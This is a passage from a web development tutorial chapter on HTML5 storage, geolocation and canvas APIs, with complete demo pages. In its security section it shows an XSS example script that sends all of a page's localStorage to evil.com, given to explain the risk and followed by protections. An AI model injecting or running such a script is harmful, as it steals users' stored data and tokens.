# Chapter 9: HTML5 APIs - In-Depth Explanation

## Introduction

HTML5 introduced powerful JavaScript APIs that enable modern web application features. These APIs work alongside HTML to create rich, interactive experiences.

**This Chapter Covers:**
- Storage APIs (localStorage, sessionStorage, IndexedDB)
- Geolocation API
- Canvas API
- Web Workers
- Other Modern APIs

**Note:** These are JavaScript APIs that work with HTML, accessed via the browser's `window` object.

---

## 9.1 Storage APIs

Modern browsers provide several ways to store data on the client side.

### localStorage - Persistent Storage

**Purpose:** Store data that persists even after browser is closed.

**Characteristics:**
- Data never expires
- Survives browser restart
- ~5-10MB storage limit (varies by browser)
- Synchronous API (blocks execution)
- Strings only (must serialize objects)
- Same-origin policy (domain specific)

**Basic Operations:**

```javascript
// Store data
localStorage.setItem('username', 'JohnDoe');
localStorage.setItem('theme', 'dark');

// Retrieve data
const username = localStorage.getItem('username');
console.log(username); // "JohnDoe"

// Remove item
localStorage.removeItem('username');

// Clear all
localStorage.clear();

// Check if key exists
if (localStorage.getItem('username') !== null) {
  console.log('Username exists');
}

// Get number of items
console.log(localStorage.length);

// Get key by index
const firstKey = localStorage.key(0);
```

**Storing Objects (JSON):**

```javascript
// ‚ùå Wrong: Will store "[object Object]"
const user = { name: 'John', age: 30 };
localStorage.setItem('user', user);

// ‚úÖ Correct: Serialize to JSON
const user = { name: 'John', age: 30 };
localStorage.setItem('user', JSON.stringify(user));

// Retrieve and parse
const storedUser = JSON.parse(localStorage.getItem('user'));
console.log(storedUser.name); // "John"
```

**Complete Example - User Preferences:**

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>LocalStorage Demo</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 600px;
      margin: 50px auto;
      padding: 20px;
      transition: background-color 0.3s, color 0.3s;
    }
    
    body.dark-theme {
      background-color: #1a1a1a;
      color: #ffffff;
    }
    
    body.light-theme {
      background-color: #ffffff;
      color: #000000;
    }
    
    .settings {
      background: rgba(0,0,0,0.05);
      padding: 20px;
      border-radius: 8px;
      margin: 20px 0;
    }
    
    label {
      display: block;
      margin: 15px 0;
    }
    
    input, select, button {
      padding: 10px;
      margin: 5px 0;
      border-radius: 4px;
      border: 1px solid #ddd;
    }
    
    button {
      background: #0066cc;
      color: white;
      border: none;
      cursor: pointer;
      padding: 10px 20px;
    }
    
    button:hover {
      background: #0052a3;
    }
    
    .storage-info {
      margin-top: 20px;
      padding: 15px;
      background: #e3f2fd;
      border-radius: 4px;
    }
  </style>
</head>
<body>
  <h1>LocalStorage Demo</h1>
  
  <div class="settings">
    <h2>User Preferences</h2>
    
    <label>
      Username:
      <input type="text" id="username" placeholder="Enter username">
    </label>
    
    <label>
      Email:
      <input type="email" id="email" placeholder="Enter email">
    </label>
    
    <label>
      Theme:
      <select id="theme">
        <option value="light">Light</option>
        <option value="dark">Dark</option>
      </select>
    </label>
    
    <label>
      Font Size:
      <select id="fontSize">
        <option value="14px">Small</option>
        <option value="16px">Medium</option>
        <option value="18px">Large</option>
      </select>
    </label>
    
    <button onclick="saveSettings()">Save Settings</button>
    <button onclick="clearSettings()">Clear All</button>
  </div>
  
  <div class="storage-info">
    <h3>Stored Data:</h3>
    <pre id="storageDisplay"></pre>
  </div>
  
  <script>
    // Load settings on page load
    window.addEventListener('DOMContentLoaded', () => {
      loadSettings();
      displayStorage();
    });
    
    function saveSettings() {
      const settings = {
        username: document.getElementById('username').value,
        email: document.getElementById('email').value,
        theme: document.getElementById('theme').value,
        fontSize: document.getElementById('fontSize').value,
        lastSaved: new Date().toISOString()
      };
      
      // Save each setting
      localStorage.setItem('userSettings', JSON.stringify(settings));
      
      // Apply settings
      applySettings(settings);
      displayStorage();
      
      alert('Settings saved!');
    }
    
    function loadSettings() {
      const stored = localStorage.getItem('userSettings');
      
      if (stored) {
        const settings = JSON.parse(stored);
        
        // Populate form
        document.getElementById('username').value = settings.username || '';
        document.getElementById('email').value = settings.email || '';
        document.getElementById('theme').value = settings.theme || 'light';
        document.getElementById('fontSize').value = settings.fontSize || '16px';
        
        // Apply settings
        applySettings(settings);
      }
    }
    
    function applySettings(settings) {
      // Apply theme
      document.body.className = settings.theme + '-theme';
      
      // Apply font size
      document.body.style.fontSize = settings.fontSize;
    }
    
    function clearSettings() {
      localStorage.clear();
      
      // Reset form
      document.getElementById('username').value = '';
      document.getElementById('email').value = '';
      document.getElementById('theme').value = 'light';
      document.getElementById('fontSize').value = '16px';
      
      // Reset appearance
      document.body.className = 'light-theme';
      document.body.style.fontSize = '16px';
      
      displayStorage();
      alert('All settings cleared!');
    }
    
    function displayStorage() {
      const display = document.getElementById('storageDisplay');
      const stored = localStorage.getItem('userSettings');
      
      if (stored) {
        display.textContent = JSON.stringify(JSON.parse(stored), null, 2);
      } else {
        display.textContent = 'No data stored';
      }
    }
  </script>
</body>
</html>
```

**Real-World Use Cases:**

```javascript
// 1. Shopping Cart
function addToCart(product) {
  let cart = JSON.parse(localStorage.getItem('cart') || '[]');
  cart.push(product);
  localStorage.setItem('cart', JSON.stringify(cart));
}

function getCart() {
  return JSON.parse(localStorage.getItem('cart') || '[]');
}

// 2. Form Auto-Save (Draft)
const form = document.getElementById('commentForm');
form.addEventListener('input', (e) => {
  localStorage.setItem('draft_' + e.target.name, e.target.value);
});

// Restore draft
document.addEventListener('DOMContentLoaded', () => {
  const inputs = form.querySelectorAll('input, textarea');
  inputs.forEach(input => {
    const draft = localStorage.getItem('draft_' + input.name);
    if (draft) input.value = draft;
  });
});

// 3. Recently Viewed Items
function addRecentlyViewed(itemId) {
  let recent = JSON.parse(localStorage.getItem('recentlyViewed') || '[]');
  
  // Remove if already exists
  recent = recent.filter(id => id !== itemId);
  
  // Add to beginning
  recent.unshift(itemId);
  
  // Keep only last 10
  recent = recent.slice(0, 10);
  
  localStorage.setItem('recentlyViewed', JSON.stringify(recent));
}

// 4. User Authentication Token
function saveAuthToken(token) {
  localStorage.setItem('authToken', token);
}

function getAuthToken() {
  return localStorage.getItem('authToken');
}

function logout() {
  localStorage.removeItem('authToken');
}
```

---

### sessionStorage - Session Storage

**Purpose:** Store data for the duration of the page session.

**Characteristics:**
- Data cleared when tab/window closes
- Separate for each tab/window
- Same API as localStorage
- ~5-10MB storage limit
- Synchronous
- Same-origin policy

**Key Difference from localStorage:**

```javascript
// localStorage: Persists across sessions
localStorage.setItem('persistent', 'data');
// Still there after closing browser

// sessionStorage: Cleared when tab closes
sessionStorage.setItem('temporary', 'data');
// Gone when tab closes
```

**Complete Example:**

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SessionStorage Demo</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 600px;
      margin: 50px auto;
      padding: 20px;
    }
    
    .demo-section {
      background: #f5f5f5;
      padding: 20px;
      margin: 20px 0;
      border-radius: 8px;
    }
    
    button {
      padding: 10px 20px;
      margin: 5px;
      background: #0066cc;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    
    input {
      padding: 10px;
      width: 300px;
      border: 1px solid #ddd;
      border-radius: 4px;
    }
  </style>
</head>
<body>
  <h1>SessionStorage Demo</h1>
  
  <div class="demo-section">
    <h2>Tab-Specific Data</h2>
    <p>This data only exists in this tab and disappears when you close it.</p>
    
    <input type="text" id="sessionInput" placeholder="Enter something">
    <button onclick="saveToSession()">Save to Session</button>
    <button onclick="clearSession()">Clear Session</button>
    
    <p>Stored value: <strong id="sessionValue">None</strong></p>
    <p><small>Try opening this page in multiple tabs - each has its own sessionStorage!</small></p>
  </div>
  
  <div class="demo-section">
    <h2>Multi-Step Form Progress</h2>
    <p>Current step: <strong id="currentStep">1</strong></p>
    
    <button onclick="nextStep()">Next Step</button>
    <button onclick="previousStep()">Previous Step</button>
    <button onclick="resetProgress()">Reset</button>
    
    <p><small>Refresh the page - your progress is saved! Close the tab - it's gone.</small></p>
  </div>
  
  <script>
    // Load on page load
    window.addEventListener('DOMContentLoaded', () => {
      loadFromSession();
      updateStepDisplay();
    });
    
    // Save to sessionStorage
    function saveToSession() {
      const value = document.getElementById('sessionInput').value;
      sessionStorage.setItem('userInput', value);
      loadFromSession();
    }
    
    // Load from sessionStorage
    function loadFromSession() {
      const value = sessionStorage.getItem('userInput') || 'None';
      document.getElementById('sessionValue').textContent = value;
      document.getElementById('sessionInput').value = value !== 'None' ? value : '';
    }
    
    // Clear sessionStorage
    function clearSession() {
      sessionStorage.clear();
      document.getElementById('sessionInput').value = '';
      loadFromSession();
    }
    
    // Multi-step form
    function nextStep() {
      let step = parseInt(sessionStorage.getItem('formStep') || '1');
      step = Math.min(step + 1, 5);
      sessionStorage.setItem('formStep', step);
      updateStepDisplay();
    }
    
    function previousStep() {
      let step = parseInt(sessionStorage.getItem('formStep') || '1');
      step = Math.max(step - 1, 1);
      sessionStorage.setItem('formStep', step);
      updateStepDisplay();
    }
    
    function resetProgress() {
      sessionStorage.removeItem('formStep');
      updateStepDisplay();
    }
    
    function updateStepDisplay() {
      const step = sessionStorage.getItem('formStep') || '1';
      document.getElementById('currentStep').textContent = step;
    }
  </script>
</body>
</html>
```

**Use Cases:**

```javascript
// 1. Wizard/Multi-step form progress
sessionStorage.setItem('wizardStep', '3');
sessionStorage.setItem('wizardData', JSON.stringify(formData));

// 2. Temporary filters/sorting
sessionStorage.setItem('productFilters', JSON.stringify({
  category: 'electronics',
  priceRange: '100-500',
  sortBy: 'price-asc'
}));

// 3. Page state (scroll position, tabs, etc.)
sessionStorage.setItem('scrollPosition', window.scrollY);

// Restore on page load
window.addEventListener('DOMContentLoaded', () => {
  const scrollPos = sessionStorage.getItem('scrollPosition');
  if (scrollPos) window.scrollTo(0, parseInt(scrollPos));
});

// 4. Flash messages (one-time notifications)
function showFlashMessage(message) {
  sessionStorage.setItem('flashMessage', message);
}

window.addEventListener('DOMContentLoaded', () => {
  const flash = sessionStorage.getItem('flashMessage');
  if (flash) {
    alert(flash);
    sessionStorage.removeItem('flashMessage');
  }
});
```

---

### localStorage vs sessionStorage Comparison

```javascript
// ============================================
// localStorage: Persistent across sessions
// ============================================

// Set data
localStorage.setItem('theme', 'dark');

// Close browser and reopen
console.log(localStorage.getItem('theme')); // Still "dark"

// Open in new tab
console.log(localStorage.getItem('theme')); // Still "dark"

// ============================================
// sessionStorage: Tab-specific, temporary
// ============================================

// Set data in Tab A
sessionStorage.setItem('tabData', 'Tab A');

// Open new Tab B
console.log(sessionStorage.getItem('tabData')); // null (different tab!)

// Refresh Tab A
console.log(sessionStorage.getItem('tabData')); // "Tab A" (still there)

// Close Tab A and reopen
console.log(sessionStorage.getItem('tabData')); // null (session ended)
```

**Visual Comparison:**

```
localStorage:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Browser Closed & Reopened    ‚îÇ
‚îÇ Data: ‚úì STILL THERE          ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

sessionStorage:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Browser Closed & Reopened    ‚îÇ
‚îÇ Data: ‚úó GONE                 ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ New Tab/Window Opened        ‚îÇ
‚îÇ localStorage: ‚úì Shared       ‚îÇ
‚îÇ sessionStorage: ‚úó Separate   ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

### Storage Events

Monitor storage changes across tabs/windows.

```javascript
// Listen for storage changes
window.addEventListener('storage', (e) => {
  console.log('Storage changed!');
  console.log('Key:', e.key);
  console.log('Old value:', e.oldValue);
  console.log('New value:', e.newValue);
  console.log('URL:', e.url);
  console.log('Storage area:', e.storageArea);
});

// Example: Sync user status across tabs
// Tab 1: User logs out
localStorage.setItem('userLoggedIn', 'false');

// Tab 2: Automatically detects change and updates UI
window.addEventListener('storage', (e) => {
  if (e.key === 'userLoggedIn' && e.newValue === 'false') {
    window.location.href = '/login';
  }
});
```

---

### Storage Best Practices

```javascript
// 1. Always wrap in try-catch (storage can be full or disabled)
function safeSetItem(key, value) {
  try {
    localStorage.setItem(key, value);
    return true;
  } catch (e) {
    if (e.name === 'QuotaExceededError') {
      console.error('Storage quota exceeded');
    }
    return false;
  }
}

// 2. Create wrapper functions
const Storage = {
  set(key, value) {
    try {
      localStorage.setItem(key, JSON.stringify(value));
      return true;
    } catch (e) {
      console.error('Failed to save:', e);
      return false;
    }
  },
  
  get(key, defaultValue = null) {
    try {
      const item = localStorage.getItem(key);
      return item ? JSON.parse(item) : defaultValue;
    } catch (e) {
      console.error('Failed to retrieve:', e);
      return defaultValue;
    }
  },
  
  remove(key) {
    try {
      localStorage.removeItem(key);
      return true;
    } catch (e) {
      console.error('Failed to remove:', e);
      return false;
    }
  },
  
  clear() {
    try {
      localStorage.clear();
      return true;
    } catch (e) {
      console.error('Failed to clear:', e);
      return false;
    }
  }
};

// Usage
Storage.set('user', { name: 'John', age: 30 });
const user = Storage.get('user');

// 3. Set expiration times
function setWithExpiry(key, value, ttl) {
  const now = new Date();
  const item = {
    value: value,
    expiry: now.getTime() + ttl // ttl in milliseconds
  };
  localStorage.setItem(key, JSON.stringify(item));
}

function getWithExpiry(key) {
  const itemStr = localStorage.getItem(key);
  
  if (!itemStr) return null;
  
  const item = JSON.parse(itemStr);
  const now = new Date();
  
  // Check if expired
  if (now.getTime() > item.expiry) {
    localStorage.removeItem(key);
    return null;
  }
  
  return item.value;
}

// Usage: Cache for 1 hour
setWithExpiry('apiData', data, 3600000);

// 4. Namespace your keys
const APP_PREFIX = 'myapp_';

function setItem(key, value) {
  localStorage.setItem(APP_PREFIX + key, value);
}

function getItem(key) {
  return localStorage.getItem(APP_PREFIX + key);
}
```

---

### Security Considerations

```javascript
// ‚ö†Ô∏è WARNING: Never store sensitive data in localStorage!

// ‚ùå NEVER DO THIS:
localStorage.setItem('creditCard', '4111-1111-1111-1111');
localStorage.setItem('password', 'myPassword123');
localStorage.setItem('ssn', '123-45-6789');

// ‚ö†Ô∏è Be careful with:
localStorage.setItem('authToken', token); // Can be accessed by XSS attacks

// ‚úÖ Safer alternatives:
// - Use httpOnly cookies for sensitive tokens
// - Encrypt sensitive data before storing
// - Use short expiration times
// - Clear on logout

// XSS Attack Example (why localStorage is vulnerable):
// Malicious script injected into page:
<script>
  // Attacker can steal all localStorage data
  fetch('https://evil.com/steal?data=' + JSON.stringify(localStorage));
</script>

// ‚úÖ Protection:
// 1. Sanitize all user input
// 2. Use Content Security Policy (CSP)
// 3. Don't store sensitive data client-side
// 4. Use httpOnly cookies for auth tokens
```

---

## 9.2 Geolocation API

**Purpose:** Get user's geographic location (requires permission).

**Basic Usage:**

```javascript
// Check if geolocation is supported
if ('geolocation' in navigator) {
  console.log('Geolocation is available');
} else {
  console.log('Geolocation is NOT available');
}

// Get current position (one-time)
navigator.geolocation.getCurrentPosition(
  // Success callback
  (position) => {
    console.log('Latitude:', position.coords.latitude);
    console.log('Longitude:', position.coords.longitude);
    console.log('Accuracy:', position.coords.accuracy, 'meters');
  },
  // Error callback
  (error) => {
    console.error('Error:', error.message);
  },
  // Options
  {
    enableHighAccuracy: true,  // Use GPS if available
    timeout: 5000,             // Wait max 5 seconds
    maximumAge: 0              // Don't use cached position
  }
);
```

**Position Object Properties:**

```javascript
navigator.geolocation.getCurrentPosition((position) => {
  const coords = position.coords;
  
  console.log('Latitude:', coords.latitude);        // e.g., 37.7749
  console.log('Longitude:', coords.longitude);      // e.g., -122.4194
  console.log('Accuracy:', coords.accuracy);        // meters
  console.log('Altitude:', coords.altitude);        // meters (or null)
  console.log('Altitude Accuracy:', coords.altitudeAccuracy); // meters (or null)
  console.log('Heading:', coords.heading);          // degrees (or null)
  console.log('Speed:', coords.speed);              // meters/second (or null)
  console.log('Timestamp:', position.timestamp);    // milliseconds
});
```

**Complete Example - Location Finder:**

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Geolocation Demo</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 800px;
      margin: 50px auto;
      padding: 20px;
    }
    
    .location-info {
      background: #e3f2fd;
      padding: 20px;
      border-radius: 8px;
      margin: 20px 0;
    }
    
    .location-info p {
      margin: 10px 0;
    }
    
    button {
      padding: 12px 24px;
      background: #0066cc;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
      margin: 10px 10px 10px 0;
    }
    
    button:hover {
      background: #0052a3;
    }
    
    button:disabled {
      background: #ccc;
      cursor: not-allowed;
    }
    
    #map {
      width: 100%;
      height: 400px;
      border: 1px solid #ddd;
      border-radius: 8px;
      margin-top: 20px;
    }
    
    .error {
      background: #ffebee;
      color: #c62828;
      padding: 15px;
      border-radius: 4px;
      margin: 20px 0;
    }
    
    .loading {
      text-align: center;
      padding: 20px;
      color: #666;
    }
  </style>
</head>
<body>
  <h1>Geolocation API Demo</h1>
  
  <button onclick="getLocation()">Get My Location</button>
  <button onclick="watchLocation()" id="watchBtn">Start Tracking</button>
  <button onclick="stopWatching()" id="stopBtn" disabled>Stop Tracking</button>
  
  <div id="status"></div>
  
  <div id="locationInfo" class="location-info" style="display: none;">
    <h3>Your Location:</h3>
    <p><strong>Latitude:</strong> <span id="latitude"></span></p>
    <p><strong>Longitude:</strong> <span id="longitude"></span></p>
    <p><strong>Accuracy:</strong> <span id="accuracy"></span> meters</p>
    <p><strong>Altitude:</strong> <span id="altitude"></span></p>
    <p><strong>Speed:</strong> <span id="speed"></span></p>
    <p><strong>Heading:</strong> <span id="heading"></span></p>
    <p><strong>Timestamp:</strong> <span id="timestamp"></span></p>
  </div>
  
  <div id="map"></div>
  
  <script>
    let watchId = null;
    
    // Check if geolocation is supported
    if (!('geolocation' in navigator)) {
      document.getElementById('status').innerHTML = 
        '<div class="error">Geolocation is not supported by your browser</div>';
    }
    
    // Get current position once
    function getLocation() {
      showStatus('Getting your location...', 'loading');
      
      navigator.geolocation.getCurrentPosition(
        showPosition,
        showError,
        {
          enableHighAccuracy: true,
          timeout: 5000,
          maximumAge: 0
        }
      );
    }
    
    // Watch position continuously
    function watchLocation() {
      if (watchId !== null) return;
      
      showStatus('Tracking your location...', 'loading');
      
      watchId = navigator.geolocation.watchPosition(
        showPosition,
        showError,
        {
          enableHighAccuracy: true,
          timeout: 5000,
          maximumAge: 0
        }
      );
      
      document.getElementById('watchBtn').disabled = true;
      document.getElementById('stopBtn').disabled = false;
    }
    
    // Stop watching
    function stopWatching() {
      if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
        watchId = null;
        showStatus('Tracking stopped', 'info');
        
        document.getElementById('watchBtn').disabled = false;
        document.getElementById('stopBtn').disabled = true;
      }
    }
    
    // Success callback
    function showPosition(position) {
      const coords = position.coords;
      
      // Show location info
      document.getElementById('locationInfo').style.display = 'block';
      document.getElementById('latitude').textContent = coords.latitude.toFixed(6);
      document.getElementById('longitude').textContent = coords.longitude.toFixed(6);
      document.getElementById('accuracy').textContent = coords.accuracy.toFixed(2);
      document.getElementById('altitude').textContent = coords.altitude ? coords.altitude.toFixed(2) + ' meters' : 'Not available';
      document.getElementById('speed').textContent = coords.speed ? coords.speed.toFixed(2) + ' m/s' : 'Not available';
      document.getElementById('heading').textContent = coords.heading ? coords.heading.toFixed(2) + '¬∞' : 'Not available';
      document.getElementById('timestamp').textContent = new Date(position.timestamp).toLocaleString();
      
      // Show map
      showMap(coords.latitude, coords.longitude);
      
      showStatus('Location found!', 'success');
    }
    
    // Error callback
    function showError(error) {
      let message = '';
      
      switch(error.code) {
        case error.PERMISSION_DENIED:
          message = 'User denied the request for Geolocation.';
          break;
        case error.POSITION_UNAVAILABLE:
          message = 'Location information is unavailable.';
          break;
        case error.TIMEOUT:
          message = 'The request to get user location timed out.';
          break;
        case error.UNKNOWN_ERROR:
          message = 'An unknown error occurred.';
          break;
      }
      
      showStatus(message, 'error');
    }
    
    // Show status message
    function showStatus(message, type) {
      const statusDiv = document.getElementById('status');
      
      if (type === 'error') {
        statusDiv.innerHTML = `<div class="error">${message}</div>`;
      } else if (type === 'loading') {
        statusDiv.innerHTML = `<div class="loading">${message}</div>`;
      } else {
        statusDiv.innerHTML = `<div class="location-info"><p>${message}</p></div>`;
      }
    }
    
    // Show map (simple visualization)
    function showMap(lat, lng) {
      const mapDiv = document.getElementById('map');
      
      // Create Google Maps link
      const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}&z=15&output=embed`;
      
      mapDiv.innerHTML = `
        <iframe 
          width="100%" 
          height="400" 
          frameborder="0" 
          style="border:0; border-radius: 8px;"
          src="${mapsUrl}"
          allowfullscreen>
        </iframe>
      `;
    }
  </script>
</body>
</html>
```

**Real-World Use Cases:**

```javascript
// 1. Find Nearby Locations
async function findNearbyStores(latitude, longitude) {
  const response = await fetch(
    `/api/stores?lat=${latitude}&lng=${longitude}&radius=5000`
  );
  const stores = await response.json();
  return stores;
}

navigator.geolocation.getCurrentPosition(async (position) => {
  const stores = await findNearbyStores(
    position.coords.latitude,
    position.coords.longitude
  );
  displayStores(stores);
});

// 2. Weather Based on Location
async function getLocalWeather(latitude, longitude) {
  const response = await fetch(
    `https://api.weather.com/current?lat=${latitude}&lon=${longitude}`
  );
  return response.json();
}

// 3. Delivery Tracking
function trackDelivery() {
  navigator.geolocation.watchPosition(
    (position) => {
      // Send position to server
      updateDeliveryStatus({
        lat: position.coords.latitude,
        lng: position.coords.longitude,
        timestamp: position.timestamp
      });
    },
    (error) => console.error('Tracking error:', error),
    { enableHighAccuracy: true }
  );
}

// 4. Geo-Fencing (Check if user is in area)
function isInGeofence(lat, lng, centerLat, centerLng, radiusMeters) {
  const R = 6371000; // Earth's radius in meters
  const dLat = toRad(centerLat - lat);
  const dLon = toRad(centerLng - lng);
  
  const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
            Math.cos(toRad(lat)) * Math.cos(toRad(centerLat)) *
            Math.sin(dLon/2) * Math.sin(dLon/2);
  
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
  const distance = R * c;
  
  return distance <= radiusMeters;
}

function toRad(degrees) {
  return degrees * (Math.PI / 180);
}

// Check if user enters geofence
navigator.geolocation.watchPosition((position) => {
  const inStore = isInGeofence(
    position.coords.latitude,
    position.coords.longitude,
    37.7749,  // Store latitude
    -122.4194, // Store longitude
    100        // 100 meter radius
  );
  
  if (inStore) {
    alert('Welcome to our store! Here\'s a special offer!');
  }
});
```

---

## 9.3 Canvas API

**Purpose:** Draw graphics, animations, and visualizations using JavaScript.

**Basic Setup:**

```html
<canvas id="myCanvas" width="800" height="600">
  Your browser doesn't support canvas
</canvas>

<script>
  const canvas = document.getElementById('myCanvas');
  const ctx = canvas.getContext('2d');
  
  // Now you can draw!
</script>
```

**Drawing Basic Shapes:**

```javascript
const canvas = document.getElementById('myCanvas');
const ctx = canvas.getContext('2d');

// Rectangle
ctx.fillStyle = 'blue';
ctx.fillRect(50, 50, 200, 100); // x, y, width, height

// Stroke rectangle (outline only)
ctx.strokeStyle = 'red';
ctx.strokeRect(300, 50, 200, 100);

// Clear area
ctx.clearRect(75, 75, 50, 50);

// Circle
ctx.beginPath();
ctx.arc(400, 300, 50, 0, Math.PI * 2); // x, y, radius, startAngle, endAngle
ctx.fillStyle = 'green';
ctx.fill();

// Line
ctx.beginPath();
ctx.moveTo(100, 400);
ctx.lineTo(700, 400);
ctx.strokeStyle = 'black';
ctx.lineWidth = 5;
ctx.stroke();

// Triangle
ctx.beginPath();
ctx.moveTo(400, 450);
ctx.lineTo(350, 550);
ctx.lineTo(450, 550);
ctx.closePath();
ctx.fillStyle = 'orange';
ctx.fill();
```

**Complete Canvas Example:**

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Canvas Demo</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 900px;
      margin: 20px auto;
      padding: 20px;
    }
    
    canvas {
      border: 2px solid #333;
      display: block;
      margin: 20px auto;
      cursor: crosshair;
    }
    
    .controls {
      text-align: center;
      margin: 20px 0;
    }
    
    button {
      padding: 10px 20px;
      margin: 5px;
      background: #0066cc;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    
    button:hover {
      background: #0052a3;
    }
    
    input[type="color"] {
      width: 50px;
      height: 40px;
      border: none;
      cursor: pointer;
    }
    
    input[type="range"] {
      width: 200px;
      vertical-align: middle;
    }
  </style>
</head>
<body>
  <h1>Canvas Drawing App</h1>
  
  <div class="controls">
    <label>Color: <input type="color" id="colorPicker" value="#000000"></label>
    <label>Size: <input type="range" id="sizePicker" min="1" max="50" value="5"> <span id="sizeDisplay">5</span>px</label>
    <button onclick="clearCanvas()">Clear</button>
    <button onclick="downloadCanvas()">Download</button>
  </div>
  
  <canvas id="drawingCanvas" width="800" height="600"></canvas>
  
  <script>
    const canvas = document.getElementById('drawingCanvas');
    const ctx = canvas.getContext('2d');
    const colorPicker = document.getElementById('colorPicker');
    const sizePicker = document.getElementById('sizePicker');
    const sizeDisplay = document.getElementById('sizeDisplay');
    
    let isDrawing = false;
    let lastX = 0;
    let lastY = 0;
    
    // Set initial canvas background
    ctx.fillStyle = 'white';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    
    // Update size display
    sizePicker.addEventListener('input', (e) => {
      sizeDisplay.textContent = e.target.value;
    });
    
    // Mouse events
    canvas.addEventListener('mousedown', startDrawing);
    canvas.addEventListener('mousemove', draw);
    canvas.addEventListener('mouseup', stopDrawing);
    canvas.addEventListener('mouseout', stopDrawing);
    
    // Touch events for mobile
    canvas.addEventListener('touchstart', handleTouch);
    canvas.addEventListener('touchmove', handleTouch);
    canvas.addEventListener('touchend', stopDrawing);
    
    function startDrawing(e) {
      isDrawing = true;
      [lastX, lastY] = [e.offsetX, e.offsetY];
    }
    
    function draw(e) {
      if (!isDrawing) return;
      
      ctx.strokeStyle = colorPicker.value;
      ctx.lineWidth = sizePicker.value;
      ctx.lineCap = 'round';
      ctx.lineJoin = 'round';
      
      ctx.beginPath();
      ctx.moveTo(lastX, lastY);
      ctx.lineTo(e.offsetX, e.offsetY);
      ctx.stroke();
      
      [lastX, lastY] = [e.offsetX, e.offsetY];
    }
    
    function stopDrawing() {
      isDrawing = false;
    }
    
    function handleTouch(e) {
      e.preventDefault();
      const touch = e.touches[0];
      const rect = canvas.getBoundingClientRect();
      const x = touch.clientX - rect.left;
      const y = touch.clientY - rect.top;
      
      if (e.type === 'touchstart') {
        isDrawing = true;
        [lastX, lastY] = [x, y];
      } else if (e.type === 'touchmove' && isDrawing) {
        const mouseEvent = new MouseEvent('mousemove', {
          clientX: touch.clientX,
          clientY: touch.clientY
        });
        Object.defineProperty(mouseEvent, 'offsetX', { value: x });
        Object.defineProperty(mouseEvent, 'offsetY', { value: y });
        draw(mouseEvent);
      }
    }
    
    function clearCanvas() {
      ctx.fillStyle = 'white';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
    }
    
    function downloadCanvas() {
      const link = document.createElement('a');
      link.download = 'drawing.png';
      link.href = canvas.toDataURL();
      link.click();
    }
  </script>
</body>
</html>
```

**Animated Canvas Example:**

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Canvas Animation</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
      background: #000;
    }
    canvas {
      display: block;
    }
  </style>
</head>
<body>
  <canvas id="canvas"></canvas>
  
  <script>
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    
    // Set canvas size
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    
    // Particle class
    class Particle {
